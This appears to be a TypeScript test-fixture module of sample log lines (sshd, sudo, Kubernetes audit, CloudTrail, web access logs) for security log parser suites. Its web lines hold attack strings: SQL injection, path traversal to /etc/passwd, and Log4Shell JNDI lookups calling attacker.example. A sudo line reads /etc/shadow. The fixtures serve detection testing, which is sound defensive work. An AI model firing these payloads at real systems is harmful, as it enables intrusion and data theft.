import { JSONObject } from "../../../../Types/JSON";
import { SecurityLogLine } from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogLine";

/*
 * Log lines as the sources write them, for the log parser suites: real
 * shapes, made-up names and documentation addresses (RFC 5737 and 3849).
 *
 * Not a test file itself (jest only collects *.test.ts).
 */

export const LOG_TIME: Date = new Date("2026-10-19T10:00:00.000Z");

export function logLine(
  body: string,
  attributes: JSONObject = {},
  logId: string = "0192f1a0-0000-7000-8000-000000000001",
): SecurityLogLine {
  return { body, attributes, time: LOG_TIME, logId };
}

// sshd, as an auth log, the journal and syslog write it.
export const SSH_LINES: {
  failedPasswordInvalidUser: string;
  failedPasswordRoot: string;
  failedPublicKeyIpv6: string;
  invalidUser: string;
  acceptedPublicKey: string;
  acceptedPassword: string;
  acceptedKeyboardInteractive: string;
  failedNone: string;
} = {
  failedPasswordInvalidUser:
    "Oct 19 10:00:01 web-03 sshd[2210]: Failed password for invalid user admin from 203.0.113.7 port 52314 ssh2",
  failedPasswordRoot:
    "Failed password for root from 198.51.100.23 port 41200 ssh2",
  failedPublicKeyIpv6:
    "sshd[77]: Failed publickey for git from 2001:db8::1 port 2222 ssh2: RSA SHA256:4vKlHy7Q",
  invalidUser: "Invalid user oracle from 203.0.113.8 port 60001",
  acceptedPublicKey:
    "Accepted publickey for ubuntu from 198.51.100.4 port 51234 ssh2: ED25519 SHA256:p9cIzwJZ",
  acceptedPassword:
    "Accepted password for alice from 192.0.2.10 port 50000 ssh2",
  acceptedKeyboardInteractive:
    "Accepted keyboard-interactive/pam for bob from 192.0.2.11 port 50001 ssh2",
  failedNone: "Failed none for invalid user test from 203.0.113.9 port 1 ssh2",
};

// Lines near an SSH sign-in that are not one.
export const NOT_SSH_SIGN_INS: Array<string> = [
  "Failed to start nginx.service: Unit nginx.service not found.",
  "Failed password for root from not-an-address port 22 ssh2",
  "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.7  user=root",
  "Received disconnect from 203.0.113.7 port 52314:11: Bye Bye [preauth]",
  "Failed magic for root from 203.0.113.7 port 22 ssh2",
  "Connection closed by authenticating user root 203.0.113.7 port 39782 [preauth]",
  "Accepted the terms for the contract from legal",
  "",
];

export const SUDO_LINES: {
  commandRun: string;
  wrongPassword: string;
  notInSudoers: string;
  withoutTty: string;
} = {
  commandRun:
    "Oct 19 10:02:11 web-03 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
  wrongPassword:
    "alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
  notInSudoers:
    "bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/ls",
  withoutTty: "carol : PWD=/srv ; USER=postgres ; COMMAND=/usr/bin/psql -l",
};

export const NOT_SUDO_LINES: Array<string> = [
  "COMMAND=/bin/ls",
  "nothing here ; COMMAND=/bin/ls",
  "two words : TTY=pts/0 ; COMMAND=",
  "pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)",
];

// One Kubernetes API server audit event, as audit.k8s.io/v1 writes it.
export function auditEvent(overrides: JSONObject): JSONObject {
  return {
    kind: "Event",
    apiVersion: "audit.k8s.io/v1",
    level: "Metadata",
    auditID: "1d2c7f0e-6c3a-4c1e-9a55-000000000001",
    stage: "ResponseComplete",
    requestURI: "/api/v1/namespaces/default/pods",
    verb: "get",
    user: {
      username: "alice@example.com",
      groups: ["system:authenticated"],
    },
    sourceIPs: ["198.51.100.20"],
    userAgent: "kubectl/v1.31.0",
    objectRef: {
      resource: "pods",
      namespace: "default",
      name: "web-7d9",
      apiVersion: "v1",
    },
    responseStatus: { metadata: {}, code: 200 },
    requestReceivedTimestamp: "2026-10-19T09:59:59.000000Z",
    stageTimestamp: "2026-10-19T10:00:00.000000Z",
    ...overrides,
  };
}

// One CloudTrail record, as CloudTrail writes it.
export function cloudTrailRecord(overrides: JSONObject): JSONObject {
  return {
    eventVersion: "1.09",
    userIdentity: {
      type: "IAMUser",
      principalId: "AIDAEXAMPLE",
      arn: "arn:aws:iam::111122223333:user/alice",
      accountId: "111122223333",
      userName: "alice",
    },
    eventTime: "2026-10-19T09:58:00Z",
    eventSource: "iam.amazonaws.com",
    eventName: "CreateAccessKey",
    awsRegion: "us-east-1",
    sourceIPAddress: "198.51.100.30",
    userAgent: "aws-cli/2.17",
    requestParameters: { userName: "alice" },
    responseElements: null,
    requestID: "5d2c7f0e-0000-0000-0000-000000000001",
    eventID: "8f1c2e3d-0000-0000-0000-000000000001",
    readOnly: false,
    eventType: "AwsApiCall",
    managementEvent: true,
    recipientAccountId: "111122223333",
    eventCategory: "Management",
    ...overrides,
  };
}

export const WEB_LINES: {
  sqlInjectionEncoded: string;
  pathTraversal: string;
  log4ShellInUserAgent: string;
  jsonAccessLog: string;
  log4ShellInApplicationLog: string;
} = {
  sqlInjectionEncoded:
    '203.0.113.40 - - [19/Oct/2026:10:00:00 +0000] "GET /item?id=1%27%20or%201%3D1 HTTP/1.1" 200 512 "-" "sqlmap/1.7.2#stable"',
  pathTraversal:
    '203.0.113.41 - - [19/Oct/2026:10:00:05 +0000] "GET /static/../../etc/passwd HTTP/1.1" 404 153 "-" "curl/8.5.0"',
  log4ShellInUserAgent:
    '203.0.113.42 - - [19/Oct/2026:10:00:09 +0000] "GET / HTTP/1.1" 200 612 "-" "${jndi:ldap://attacker.example/a}"',
  jsonAccessLog: JSON.stringify({
    remote_addr: "203.0.113.43",
    request: "GET /search?q=1 union select password from users HTTP/1.1",
    status: "200",
    http_user_agent: "python-requests/2.32",
  }),
  log4ShellInApplicationLog:
    "WARN rejected header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44 on /api/v1/orders",
};

export const NOT_WEB_ATTACKS: Array<string> = [
  '203.0.113.40 - - [19/Oct/2026:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"',
  '{"remote_addr":"203.0.113.40","request":"GET /healthz HTTP/1.1","status":"200"}',
  "INFO order 1234 shipped",
];
